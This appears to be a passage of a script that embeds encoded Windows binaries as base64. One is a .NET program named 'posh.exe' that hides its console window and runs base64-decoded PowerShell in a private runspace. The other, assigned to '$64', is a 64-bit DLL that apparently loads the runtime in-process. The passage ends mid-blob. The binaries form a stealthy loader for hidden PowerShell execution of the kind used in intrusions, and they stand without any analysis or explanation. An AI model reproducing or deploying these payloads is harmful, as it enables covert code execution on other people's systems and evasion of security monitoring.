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aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFJ1bnNwYWNlSW52b2tlAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBQU09iamVjdABJbnZva2UAQ2xvc2UAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBJRW51bWVyYXRvcmAxAEdldEVudW1lcmF0b3IAZ2V0X0N1cnJlbnQAQXBwZW5kAFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51bWVyYXRvcgBNb3ZlTmV4dABJRGlzcG9zYWJsZQBEaXNwb3NlAFRvU3RyaW5nAFN0cmluZwBUcmltAEVuY29kaW5nAGdldF9Vbmljb2RlAENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAAAADIAAAAAAAEia8UX96xUKNIcRtUFz57wAIt3pcVhk04IkCBggEAAAAAAQFAAAAAwAAGAUAAgIYCAMgAAEEAAEODgQAAQEOAwAAAQQgAQEIBCABAQ4IMb84Vq02TjUEAAASGQUgAQESGQQgABIhBCAAEiUIIAAVEikBEi0GFRIpARItCCAAFRI1ARMABhUSNQESLQQgABMABSABEjEcAyAAAgMgAA4aBwkSGRIdEiEVEikBEi0SMRItDhUSNQESLQIEAAASRQUAAR0FDgUgAQ4dBQQHAhgOAwcBGAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAvCgAAAAAAAAAAAAA3igAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAoAAAAAAAAAAAAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAAA4AACAAAAAAAAAAAAAAAAAAAABAAEAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAAAAACQAAAAoEAAADwCAAAAAAAAAAAAAOBCAADqAQAAAAAAAAAAAAA8AjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAAPwAAAAAAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAAAAA0AAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHAAbwBzAGgALgBlAHgAZQAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwACQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABwAG8AcwBoAC4AZQB4AGUAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0ieWVzIj8+DQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIi8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA8DgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHDEAEAAAAAAuP0FWX2NvbV9lcnJvckBAAAAAABwxABAAAAAALj9BVnR5cGVfaW5mb0BAABwxABAAAAAALj9BVmJhZF9hbGxvY0BzdGRAQAAcMQAQAAAAAC4/QVZleGNlcHRpb25Ac3RkQEAAHDEAEAAAAAAuP0FWYmFkX2FycmF5X25ld19sZW5ndGhAc3RkQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAADkAAAA4AAAAIwAAACEAAAAgAAAANgAAAEcAAABKAAAADAAAABMAAABOAAAAUAAAAE4AAABXAAAATgAAAF0AAABUAAAAVQAAAEwAAABaAAAAWwAAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAGAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAgAAADAAAIAAAAAAAAAAAAAAAAAAAAEACQQAAEgAAABgkAAAfQEAAAAAAAAAAAAAAAAAAAAAAAA8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcgc3RhbmRhbG9uZT0neWVzJz8+DQo8YXNzZW1ibHkgeG1sbnM9J3VybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxJyBtYW5pZmVzdFZlcnNpb249JzEuMCc+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSdhc0ludm9rZXInIHVpQWNjZXNzPSdmYWxzZScgLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAC8AAAAATAWMCUwYDC2MMUwEjGGMcMx2jHuMRkyHjIrMlcyaDJ+MosykDKiMqcy0TLWMiYzLjNLM1YzYDNlM2ozbzOmM7UzwzTqNPM0/TQPNZs1oDXTNbY2xTYENx83OzdTN6I3qDfKN/g3hjimOKs4ujgcOSs5tTnQOek5SzqOOtg6/DobOz47dzuHOzI8YTxxPIg8mTyqPK88yDzNPNo8Jz1EPU49XD1uPYM9wT3TPY0+wD4JP2U/ACAAABABAAAoMFkwqDC7MM4w2jDqMPswITE2MT0xQzFVMV8xvTHKMfEx+TESMnwygTKbMrkywjLNMtQy9DL6MgAzBjMMMxIzGTMgMyczLjM1MzwzQzNLM1MzWzNnM3AzdTN7M4UzjzOfM68zvzPIM+ozAjQINB00NTQ7NEs0cTSINLk01jTsNAA1GzUnNTY1PzVMNXs1gzWONZQ1mjWmNaw1zzUANqs2yjbUNuU28jb3Nh03IjdRN243sTe/N9o35TdtOHY4fjjFONQ42zgRORo5JzkyOTs5TjmQOZY5nDmiOag5rjm0Obo5wDnGOcw50jnYOd455DnqOfA59jn8OQI6CDoUOkE6nDr0OgE7BzsAMAAAvAAAAOAw6DAQMRgxHDEgMSQxKDEsMTAxSDFMMVAxZDFoMWwxHDMgMygzSDNMM1wzYDNoM4AzkDOUM6QzqDOwM8gz2DPcM+wz8DP0M/wzFDQkNCg0ODQ8NEA0RDRMNGQ0rDe4N9w3/DcEOAw4FDgcOCQ4MDhQOFg4YDhoOHA4jDiQOJg4oDioOLA4xDjgOAA5HDkgOTw5QDlIOVA5WDlcOWQ5eDmAOZQ5nDmkOaw5sDm0Obw50DkAAABAAAAMAAAAADAAAABwAAAUAAAAWDt0O4w7qDvEOwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $64="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